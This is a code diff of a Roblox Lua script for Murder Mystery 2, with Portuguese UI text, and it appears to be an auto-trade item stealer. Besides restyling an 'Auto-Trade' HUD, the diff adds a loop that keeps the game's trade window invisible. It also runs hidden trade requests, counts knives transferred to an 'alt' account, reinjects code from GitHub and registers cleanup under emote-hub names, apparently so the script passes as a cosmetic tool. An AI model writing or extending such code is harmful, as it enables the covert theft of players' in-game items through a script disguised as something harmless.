-    addCorner(Footer, 8)
-
-    local FooterTopFiller = Instance.new("Frame")
-    FooterTopFiller.Size = UDim2.new(1, 0, 0, 6)
-    FooterTopFiller.Position = UDim2.new(0, 0, 0, 0)
-    FooterTopFiller.BackgroundColor3 = ModernTheme.headerBg
-    FooterTopFiller.BorderSizePixel = 0
-    FooterTopFiller.Parent = Footer
 
     local StatusLabel = Instance.new("TextLabel")
     StatusLabel.BackgroundTransparency = 1
-    StatusLabel.Size = UDim2.new(1, -16, 1, 0)
-    StatusLabel.Position = UDim2.new(0, 8, 0, 0)
+    StatusLabel.Size = UDim2.new(1, -12, 1, 0)
+    StatusLabel.Position = UDim2.new(0, 6, 0, 0)
     StatusLabel.Text = "Atalho: [ , ] Alternar Painel  |  Status: Pronto"
-    StatusLabel.TextColor3 = ModernTheme.textDim
+    StatusLabel.TextColor3 = StudioTheme.textDim
     StatusLabel.TextSize = 11
-    StatusLabel.Font = Enum.Font.GothamMedium
+    StatusLabel.Font = Enum.Font.SourceSans
     StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
     StatusLabel.Parent = Footer
-
-    local isMinimized = false
 
     local function updateUI()
         local altPlayer = findAltInServer()
@@ -1965,19 +1909,20 @@ local function createAutoTradeHUD()
         local present = (altPlayer ~= nil)
 
         PartnerVal.Text = string.format("%s (%s)", activeAlt, present and "No mesmo servidor (Online)" or (State.ActiveAltName ~= "" and "Em outro servidor" or "Aguardando..."))
-        PartnerVal.TextColor3 = present and ModernTheme.green or (State.ActiveAltName ~= "" and ModernTheme.yellow or ModernTheme.textMuted)
+        PartnerVal.TextColor3 = present and StudioTheme.green or (State.ActiveAltName ~= "" and StudioTheme.yellow or StudioTheme.textMuted)
 
         ServerVal.Text = string.format("JobId: %s...", string.sub(game.JobId ~= "" and game.JobId or "Studio", 1, 16))
         TierVal.Text = State.TopTierDetected
         WebhookVal.Text = string.format("%s | Cmd: %s", State.WebhookStatus, State.ActiveCommand)
-        StatsVal.Text = string.format("Lotes Concluídos: %d  •  Facas: %d  •  Restantes: %d", State.TradesCompleted, State.KnivesTransferred, State.RemainingKnives)
+        StatsVal.Text = string.format("Lotes: %d  •  Facas: %d  •  Restantes: %d", State.TradesCompleted, State.KnivesTransferred, State.RemainingKnives)
+
+        ToggleBtn.Text = State.Enabled and "Auto-Trade: LIGADO" or "Auto-Trade: DESLIGADO"
+        ToggleBtn.BackgroundColor3 = State.Enabled and StudioTheme.green or StudioTheme.red
 
         if State.AllItemsTransferred then
             StatusLabel.Text = string.format("Atalho: [ , ] Alternar  |  CONCLUÍDO (0 Facas Restantes - Parado)  |  Total: %d", State.KnivesTransferred)
-            StatusLabel.TextColor3 = ModernTheme.green
         else
             StatusLabel.Text = string.format("Atalho: [ , ] Alternar  |  %s  |  Facas: %d", State.StatusMessage, State.KnivesTransferred)
-            StatusLabel.TextColor3 = ModernTheme.textDim
         end
 
         for _, child in ipairs(LogScroll:GetChildren()) do
@@ -1989,8 +1934,8 @@ local function createAutoTradeHUD()
             lbl.Size = UDim2.new(1, 0, 0, 16)
             lbl.BackgroundTransparency = 1
             lbl.Text = line
-            lbl.TextColor3 = ModernTheme.textMuted
-            lbl.Font = Enum.Font.GothamMedium
+            lbl.TextColor3 = StudioTheme.textMuted
+            lbl.Font = Enum.Font.SourceSans
             lbl.TextSize = 11
             lbl.TextXAlignment = Enum.TextXAlignment.Left
             lbl.LayoutOrder = idx
@@ -2007,7 +1952,7 @@ local function createAutoTradeHUD()
             State.TransferFinishedLogged = false
         end
         ToggleBtn.Text = State.Enabled and "Auto-Trade: LIGADO" or "Auto-Trade: DESLIGADO"
-        ToggleBtn.BackgroundColor3 = State.Enabled and ModernTheme.green or ModernTheme.red
+        ToggleBtn.BackgroundColor3 = State.Enabled and StudioTheme.green or StudioTheme.red
         addLog("Auto-Trade alternado para " .. (State.Enabled and "LIGADO" or "DESLIGADO"))
         updateUI()
     end)
@@ -2046,15 +1991,6 @@ local function createAutoTradeHUD()
     ReinjectBtn.MouseButton1Click:Connect(function()
         addLog("Reinjeção manual via GitHub acionada...")
         reinjectFromGithub()
-    end)
-
-    MinBtn.MouseButton1Click:Connect(function()
-        isMinimized = not isMinimized
-        ContentArea.Visible = not isMinimized
-        TabStrip.Visible = not isMinimized
-        Footer.Visible = not isMinimized
-        MainFrame.Size = isMinimized and UDim2.new(0, 520, 0, 32) or UDim2.new(0, 520, 0, 460)
-        MinBtn.Text = isMinimized and "+" or "—"
     end)
 
     UserInputService.InputBegan:Connect(function(input, processed)
@@ -2169,6 +2105,14 @@ local function hideAltTradeGUI()
                         cb.Position = UDim2.new(100, 0, 100, 0)
                         cb.Active = false
                     end
+                    local bg = tg:FindFirstChild("BG")
+                    if bg and (bg.Visible or bg.BackgroundTransparency < 1 or bg.Position.X.Scale < 50 or bg.Size.X.Offset > 0 or bg.Size.X.Scale > 0 or bg.Active) then
+                        bg.Visible = false
+                        bg.BackgroundTransparency = 1
+                        bg.Size = UDim2.new(0, 0, 0, 0)
+                        bg.Position = UDim2.new(100, 0, 100, 0)
+                        bg.Active = false
+                    end
                     local c = tg:FindFirstChild("Container")
                     if c and (c.Visible or c.Position.X.Scale < 50 or c.Active) then
                         c.Visible = false
@@ -2245,7 +2189,91 @@ local function hideAltTradeGUI()
     end)
 end
 
-task.spawn(createAutoTradeHUD)
+local function setupTradeGuiBgTransparency()
+    task.spawn(function()
+        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 15) or LocalPlayer:FindFirstChildOfClass("PlayerGui")
+        if not playerGui then return end
+
+        local function applyBgTransparency(bg)
+            if not bg or not bg:IsA("GuiObject") then return end
+            pcall(function()
+                bg.BackgroundTransparency = 1
+                if bg:IsA("ImageLabel") or bg:IsA("ImageButton") then
+                    bg.ImageTransparency = 1
+                end
+            end)
+            pcall(function()
+                local conn = bg:GetPropertyChangedSignal("BackgroundTransparency"):Connect(function()
+                    if bg.BackgroundTransparency < 1 then
+                        bg.BackgroundTransparency = 1
+                    end
+                end)
+                table.insert(altTradeGuiConnections, conn)
+            end)
+        end
+
+        local function hookTradeGui(tg)
+            if not tg then return end
+            local bg = tg:FindFirstChild("BG")
+            if bg then
+                applyBgTransparency(bg)
+            end
+            local conn = tg.ChildAdded:Connect(function(child)
+                if child.Name == "BG" then
+                    applyBgTransparency(child)
+                end
+            end)
+            table.insert(altTradeGuiConnections, conn)
+        end
+
+        local existingTg = playerGui:FindFirstChild("TradeGUI")
+        if existingTg then
+            hookTradeGui(existingTg)
+        end
+
+        local connTgAdded = playerGui.ChildAdded:Connect(function(child)
+            if child.Name == "TradeGUI" then
+                hookTradeGui(child)
+            end
+        end)
+        table.insert(altTradeGuiConnections, connTgAdded)
+
+        local connDesc = playerGui.DescendantAdded:Connect(function(desc)
+            if desc.Name == "BG" and desc.Parent and desc.Parent.Name == "TradeGUI" then
+                applyBgTransparency(desc)
+            end
+        end)
+        table.insert(altTradeGuiConnections, connDesc)
+
+        while true do
+            task.wait(0.2)
+            pcall(function()
+                local tg = playerGui:FindFirstChild("TradeGUI")
+                local bg = tg and tg:FindFirstChild("BG")
+                if bg and bg:IsA("GuiObject") then
+                    if bg.BackgroundTransparency < 1 then
+                        bg.BackgroundTransparency = 1
+                    end
+                end
+            end)
+        end
+    end)
+end
+
+if isMain then
+    task.spawn(createAutoTradeHUD)
+else
+    cleanAllPreviousInstances({
+        "StudioEmoteHub",
+        "BevelEmoteHub",
+        "PotassiumEmoteHub",
+        "MM2AutoTradeRelayUI",
+        "StudioAnimPackHub",
+        "StudioAnimationHub"
+    })
+end
+
+task.spawn(setupTradeGuiBgTransparency)
 task.spawn(setupInvisibleTradeRequest)
 task.spawn(hideAltTradeGUI)
 
@@ -2261,8 +2289,12 @@ env._MM2AutoTradeCleanup = function()
     end
     table.clear(altTradeGuiConnections)
     cleanAllPreviousInstances({
+        "StudioEmoteHub",
+        "BevelEmoteHub",
+        "PotassiumEmoteHub",
         "MM2AutoTradeRelayUI",
         "StudioAnimPackHub",
         "StudioAnimationHub"
     })
 end
+env._EmoteHubCleanup = env._MM2AutoTradeCleanup
